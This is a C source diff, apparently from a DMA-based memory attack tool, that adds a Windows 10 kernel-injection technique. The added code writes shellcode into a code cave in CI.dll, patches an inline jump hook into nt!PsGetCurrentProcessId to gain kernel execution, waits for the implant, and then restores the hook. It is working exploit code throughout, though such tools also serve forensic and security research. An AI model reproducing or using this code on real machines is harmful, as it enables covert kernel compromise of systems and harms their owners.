@@ -763,6 +763,8 @@ BOOL KMDOpen_UEFI(_In_ BYTE bOffsetHookBootServices)
     return KMD_SetupStage3((DWORD)qwAddrKMDDATA, pb + 0x1000, 0x1000);
 }
 
+#ifdef WIN32
+
 /*
 * Load a kernel module (KMD) into a Windows 10 system on which not both of
 * Vt-d and Virtualization Based Security is enabled. This technique relies
@@ -775,9 +777,8 @@ BOOL KMDOpen_UEFI(_In_ BYTE bOffsetHookBootServices)
 * for thread creation via PsCreateSystemThread.
 * It also patches function pointer table in HAL heap to gain initial execution.
 */
-#ifdef WIN32
 _Success_(return)
-BOOL KMDOpen_WINX64_VMM()
+BOOL KMDOpen_WINX64_2_VMM()
 {
     BOOL result = FALSE;
     BYTE pbPage[0x1000];
@@ -954,13 +955,166 @@ fail:
     Vmmx_Close();
     return result;
 }
+
+/*
+* Load a kernel module (KMD) into a Windows 10 system on which not both of
+* Vt-d and Virtualization Based Security is enabled. This technique relies
+* on analysis by MemProcFS (vmm.dll) which currently only is a Windows module.
+* as a result the initial attack may currently only take place from Windows
+* attackers.
+* The technique puts the executable shellcode inside a code cave inside CI.dll.
+* Initial code execution is gained by placing an inline hook in nt!PsGetCurrentProcessId
+*/
+_Success_(return)
+BOOL KMDOpen_WINX64_3_VMM()
+{
+    BOOL f, fResult = FALSE;
+    QWORD vaHook, vaCI, vaDataPre = 0, vaExec = 0;
+    DWORD i, cSections, dwHookJMP, paKMD = 0, cbShellcode = 0;
+    BYTE pbShellcode[0xc00], pbHookOriginalData[0x14], pbHook[13] = { 0 }, pbZero20[0x20] = { 0 };
+    PIMAGE_SECTION_HEADER pSections = NULL;
+    // ------------------------------------------------------------------------
+    // 1: Initialize MemProcFS/vmm.dll
+    // ------------------------------------------------------------------------
+    if(!Vmmx_Initialize(FALSE, FALSE)) {
+        printf("KMD: Failed initializing required MemProcFS/vmm.dll #1\n");
+        return FALSE;
+    }
+    // ------------------------------------------------------------------------
+    // 2: Load Signature.
+    // ------------------------------------------------------------------------
+    if(!Util_ParseHexFileBuiltin("DEFAULT_WINX64_STAGE23_VMM3", pbShellcode, sizeof(pbShellcode), &cbShellcode)) { goto fail; }
+    // ------------------------------------------------------------------------
+    // 3: Locate locations where to insert
+    //    code: (CI.dll 'INIT'  section)
+    //    data: (CI.dll '.data' section)
+    //    hook: (nt!PsGetCurrentProcessId)
+    // ------------------------------------------------------------------------
+    f = (vaCI = VMMDLL_ProcessGetModuleBase(4, L"CI.dll")) &&
+        VMMDLL_ProcessGetSections(4, L"CI.dll", NULL, 0, &cSections) &&
+        cSections &&
+        (pSections = LocalAlloc(LMEM_ZEROINIT, cSections * sizeof(IMAGE_SECTION_HEADER))) &&
+        VMMDLL_ProcessGetSections(4, L"CI.dll", pSections, cSections, &cSections);
+    for(i = 0; f && (i < cSections); i++) {
+        if(!strcmp("INIT", pSections[i].Name)) {
+            vaExec = vaCI + pSections[i].VirtualAddress + 0x400;
+        }
+        if(!strcmp(".data", pSections[i].Name)) {
+            vaDataPre = ((vaCI + pSections[i].VirtualAddress + pSections[i].Misc.VirtualSize + 0xfff) & ~0xfff) - 0x20;
+        }
+    }
+    if(!f || !vaExec || !vaDataPre) {
+        printf("KMD: Failed get code cave (CI.dll) #2\n");
+        goto fail;
+    }
+    f = (vaHook = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "PsGetCurrentProcessId")) &&
+        VMMDLL_MemRead(4, vaHook, pbHookOriginalData, sizeof(pbHookOriginalData));
+    if(!f) {
+        printf("KMD: Failed get hook (ntoskrnl.exe) #3\n");
+        goto fail;
+    }
+    if((pbHookOriginalData[0x00] == 0xE9)) {
+        printf("KMD: Hook already inserted #4\n");
+        goto fail_hookrestore;
+    }
+    // ------------------------------------------------------------------------
+    // 4: Prepare and Inject!
+    // ------------------------------------------------------------------------
+    f = (*(PQWORD)(pbShellcode + 0x020) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "KeGetCurrentIrql")) &&
+        (*(PQWORD)(pbShellcode + 0x028) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "PsCreateSystemThread")) &&
+        (*(PQWORD)(pbShellcode + 0x030) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "ZwClose")) &&
+        (*(PQWORD)(pbShellcode + 0x038) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "MmAllocateContiguousMemory")) &&
+        (*(PQWORD)(pbShellcode + 0x040) = VMMDLL_ProcessGetProcAddress(4, L"ntoskrnl.exe", "MmGetPhysicalAddress")) &&
+        (*(PQWORD)(pbShellcode + 0x048) = VMMDLL_ProcessGetModuleBase(4, L"ntoskrnl.exe"));
+    if(!f) {
+        printf("KMD: Failed get functions (ntoskrnl.exe) #5\n");
+        goto fail;
+    }
+    *(PQWORD)(pbShellcode + 0x018) = vaDataPre;
+    memcpy(pbShellcode + 0x004, pbHookOriginalData, sizeof(pbHookOriginalData));
+    if(!VMMDLL_MemWrite(4, vaExec, pbShellcode, cbShellcode)) {
+        printf("KMD: Failed MemWrite (CI.dll) #6\n");
+        goto fail;
+    }
+    if((vaHook - vaExec > 0x7fff0000) && (vaExec - vaHook > 0x7fff0000)) {
+        // ABSOLUTE JMP [MOV r10, addr + JMP r10]
+        pbHook[0] = 0x49;
+        pbHook[1] = 0xBA;
+        *(PQWORD)(pbHook + 2) = vaExec;
+        pbHook[10] = 0x41;
+        pbHook[11] = 0xFF;
+        pbHook[12] = 0xE2;
+    } else {
+        // RELATIVE JMP
+        pbHook[0] = 0xE9;   // JMP
+        *(PDWORD)(pbHook + 1) = (dwHookJMP = (DWORD)(vaExec - (vaHook + 5ULL)));
+    }
+    if(!VMMDLL_MemWrite(4, vaHook, pbHook, sizeof(pbHook))) {
+        printf("KMD: Failed MemWrite (ntoskrnl.exe) #7\n");
+        goto fail;
+    }
+    // ------------------------------------------------------------------------
+    // 5: Wait for execution.
+    // ------------------------------------------------------------------------
+    printf("KMD: Code inserted into the kernel - Waiting to receive execution.\n");
+    do {
+        Sleep(100);
+        if(!VMMDLL_MemReadEx(4, vaDataPre + 0x1c, (PBYTE)&paKMD, sizeof(DWORD), NULL, VMMDLL_FLAG_NOCACHE)) {
+            printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
+            goto fail_hookrestore;
+        }
+    } while(paKMD == 0);
+    printf("KMD: Execution received - continuing ...\n");
+    //------------------------------------------------
+    // 6: Set up reference to KMD.
+    //------------------------------------------------
+    if(ctxMain->cfg.fVerbose) {
+        printf("INFO: PA KMD BASE:  0x%08x\n", (DWORD)paKMD);
+    }
+    ctxMain->phKMD = (PKMDHANDLE)LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE));
+    if(!ctxMain->phKMD) { goto fail; }
+    ctxMain->phKMD->pk = (PKMDDATA)ctxMain->phKMD->pbPageData;
+    ctxMain->pk = ctxMain->phKMD->pk;
+    ctxMain->phKMD->dwPageAddr32 = (DWORD)paKMD;
+    LcRead(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, 4096, ctxMain->phKMD->pbPageData);
+    //------------------------------------------------
+    // 7: Retrieve physical memory range map and complete open action.
+    //------------------------------------------------
+    if(!KMD_GetPhysicalMemoryMap()) {
+        printf("KMD: Failed. Failed to retrieve physical memory map.\n");
+        printf("             KMD _may_ still be located at: 0x%08x\n", (DWORD)paKMD);
+        KMDClose();
+        goto fail_hookrestore;
+    }
+    ctxMain->cfg.qwKMD = ctxMain->phKMD->dwPageAddr32;
+    if(ctxMain->pk->MAGIC != KMDDATA_MAGIC) {
+        ctxMain->pk->MAGIC = KMDDATA_MAGIC;
+        LcWrite(ctxMain->hLC, ctxMain->phKMD->dwPageAddr32, sizeof(QWORD), ctxMain->phKMD->pbPageData);
+    }
+    fResult = TRUE;
+fail_hookrestore:
+    VMMDLL_MemWrite(4, vaHook, pbHookOriginalData, sizeof(pbHookOriginalData));
+    VMMDLL_MemWrite(4, vaDataPre, pbZero20, sizeof(pbZero20));
+fail:
+    LocalFree(pSections);
+    Vmmx_Close();
+    return fResult;
+}
+
 #endif /* WIN32 */
 #ifdef LINUX
-BOOL KMDOpen_WINX64_VMM()
+
+BOOL KMDOpen_WINX64_2_VMM()
 {
     printf("KMD: Failed. Not supported on Linux.\n");
     return FALSE;
 }
+BOOL KMDOpen_WINX64_3_VMM()
+{
+    printf("KMD: Failed. Not supported on Linux.\n");
+    return FALSE;
+}
+
 #endif /* LINUX */
 
 // https://blog.coresecurity.com/2016/08/25/getting-physical-extreme-abuse-of-intel-based-paging-systems-part-3-windows-hals-heap/
@@ -1562,7 +1716,9 @@ BOOL KMDOpen()
     } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "WIN10_X64")) {
         return KMDOpen_HalHijack();
     } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "WIN10_X64_2")) {
-        return KMDOpen_WINX64_VMM();
+        return KMDOpen_WINX64_2_VMM();
+    } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "WIN10_X64_3")) {
+        return KMDOpen_WINX64_3_VMM();
     } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "LINUX_X64_EFI")) {
         return KMDOpen_LinuxEfiRuntimeServicesHijack();
     } else if(0 == _stricmp(ctxMain->cfg.szKMDName, "UEFI_EXIT_BOOT_SERVICES")) {
